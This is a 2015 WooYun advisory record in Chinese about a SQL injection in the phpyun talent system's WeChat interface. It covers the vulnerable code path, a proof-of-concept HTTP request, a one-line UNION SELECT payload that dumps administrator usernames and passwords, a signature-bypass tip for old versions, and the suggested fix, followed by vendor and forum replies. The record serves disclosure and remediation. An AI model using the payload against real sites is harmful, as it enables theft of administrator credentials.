{"id": 73383, "wybug_id": "wooyun-2015-0150533", "wybug_title": "phpyun 第三方接口引发的注入漏洞", "wybug_corp": "php云人才系统", "wybug_author": "xiao.k", "wybug_date": "2015-10-30 10:55", "wybug_open_date": "2015-12-17 14:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-02：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-17：\t细节向公众公开  简要描述： 此注入漏洞可以获取理员的账户密码，危害比较大。 详细说明：  ## 漏洞触发条件早于14年6月2日的版本可以直接利用此漏洞。最新版本需要开启微信公众号功能才可利用。## 漏洞影响范围phpyun v4.0 build151012，以及之前版本。## 漏洞代码分析首先简单说一下微信公众号的原理。当网站绑定了微信公众号时，我们提交的内容先传到微信服务器。然后经过微信生成xml格式的数据，附加上效验码传到网站。网站根据发送的内容进行判断整理，将生成好的数据返回给微信服务器。微信服务器接收到数据后进行解析，最终再反馈给用户。此次的问题在于，phpyun对于微信提交过来的数据没有转义，保持了信任。最终导致注入的发生。关键代码位于`app\\controller\\weixin\\index.class.php`,23行\nif(!$M->checkSignature($_GET['signature'],$_GET['timestamp'],$_GET['nonce'])){echo \"非法来源地址！123\";};    $postStr = $GLOBALS[\"HTTP_RAW_POST_DATA\"];    //$postStr = file_get_contents(\"php://input\");     //var_dump($postStr);    if (!empty($postStr))\n当效验完signature之后，进入`$GLOBALS[\"HTTP_RAW_POST_DATA\"]`。我们来看一下php手册的解释。\n$HTTP\\_RAW\\_POST\\_DATA 包含 POST 提交的原始数据。参见 always\\_populate\\_raw\\_post\\_data\n我们在此可以理解为**php不会对提交的数据产生任何的转义**。当我们在微信公众号的输入框里键入关键字时。会经过程序处理到达113行。\n}elseif($MsgType=='text'){\tif($keyword){\t\t//echo $keyword;\t\t$Return = $M->searchJob($keyword);\t\t$centerStr\t\t= $Return['centerStr'];\t\t$this->MsgType  = $Return['MsgType'];\t}\t}\n我们提交的内容会被程序当作keyword传入searchJob。我们再来看看 searchJob。文件位于`app\\model\\weixin.model.php`，141行\nfunction searchJob($keyword)\t{\t\t$keyword = trim($keyword);\t\t\t\tinclude(PLUS_PATH.\"/city.cache.php\");\t\tif($keyword)\t\t{\t\t\t$keywords = @explode(' ',$keyword);\t\t\tvar_dump($keywords);\t\t\tif(is_array($keywords))\t\t\t{\t\t\t\tforeach($keywords as $key=>$value)\t\t\t\t{\t\t\t\t\t$iscity = 0;\t\t\t\t\tif($value!='')\t\t\t\t\t{\t\t\t\t\t\tforeach($city_name as $k=>$v)\t\t\t\t\t\t{\t\t\t\t\t\t\tif(strpos($v,iconv('utf-8','gbk',trim($value)))!==false)\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t$CityId[] = $k;\t\t\t\t\t\t\t\t$iscity = 1;\t\t\t\t\t\t\t}\t\t\t\t\t\t}\t\t\t\t\t\tif($iscity==0)\t\t\t\t\t\t{\t\t\t\t\t\t\t$searchJob[] = \"(`name` LIKE '%\".iconv('utf-8','gbk',trim($value)).\"%') OR (`com_name` LIKE '%\".iconv('utf-8','gbk',trim($value)).\"%')\";\t\t\t\t\t\t}\t\t\t\t\t}\t\t\t\t}\t\t\t\t\t\t\t\t$searchWhere = \"`state`='1' AND `sdate`<='\".time().\"' AND `edate`>= '\".time().\"' AND `status`<>'1' AND `r_status`<>'1' AND (\".implode(' OR ',$searchJob).\")\";\t\t\t\tif(!empty($CityId))\t\t\t\t{\t\t\t\t\t$City_id = pylode(',',$CityId);\t\t\t\t\t$searchWhere .= \" AND (`provinceid` IN (\".$City_id.\") OR `cityid` IN (\".$City_id.\") OR `three_cityid` IN (\".$City_id.\"))\";\t\t\t\t}\t\t\t\t$jobList = $this->DB_select_all(\"company_job\",$searchWhere.\" order by `lastupdate` desc limit 5\",\"`id`,`name`,`com_name`\");\t\t\t}\t\t}\n当做了几次SQL拼接以后，最终进入`DB_select_all`。补充一下：印象中早于14年6月2日的版本，并未检查系统内部weixin token是否为空。所以signature伪造为sha1('')即可通过signature。   漏洞证明：  本地环境下可以类似的构造，注意替换**signature**。\nPOST /official/phpyun/upload/weixin/index.php?signature=1&timestamp=2&nonce=3  HTTP/1.1\tHost: 127.0.0.1\tUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0\tAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\tAccept-Language: en-us,en;q=0.5\tAccept-Encoding: gzip, deflate\tCookie: ;\tConnection: keep-alive\tContent-Length: 317\t\t<xml>\t  <ToUserName><![CDATA[toUser]]></ToUserName>\t  <FromUserName><![CDATA[fromUser]]></FromUserName>\t  <CreateTime>12345678</CreateTime>\t  <MsgType><![CDATA[text]]></MsgType>\t  <Content>'))/**/UNION/**/SELECT/**/1,username,password/**/from/**/phpyun_admin_user/**/#</Content>\t  <FuncFlag>0</FuncFlag>\t</xml>\n\n\n在实际的攻击过程中，可以直接向对方公众号发送如下内容，进行注入。\n'))/**/UNION/**/SELECT/**/1,username,password/**/from/**/phpyun_admin_user/**/#\n\n\n   修复方案：  在\n$Return = $M->searchJob($keyword);\n语句前加入\n$keyword=addslashes($keyword)\n。   版权声明：转载请注明来源 xiao.k@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-10-30 11:02 厂商回复： 感谢提供，我们会尽快修复！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-10-30 12:47 |    \t\txiao.k \t\t\t( 普通白帽子  |\t\t\t        Rank:157 漏洞数:16        | 纳威网络安全导航 navisec.it)\t\t \n  确认神速.....    \n     2015-11-03 20:27 |    \t\tXser \t\t\t( 普通白帽子  |\t\t\t        Rank:365 漏洞数:83        | JDSec)\t\t \n  @xiao.k  还是uc问题？    \n     2015-11-03 20:30 |    \t\txiao.k \t\t\t( 普通白帽子  |\t\t\t        Rank:157 漏洞数:16        | 纳威网络安全导航 navisec.it)\t\t \n  @Xser 不是。话说你们jd还招人不？    \n     2015-11-03 20:57 |    \t\tXser \t\t\t( 普通白帽子  |\t\t\t        Rank:365 漏洞数:83        | JDSec)\t\t \n  @xiao.k 这个不清楚，你直接问疯子或者0f吧    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}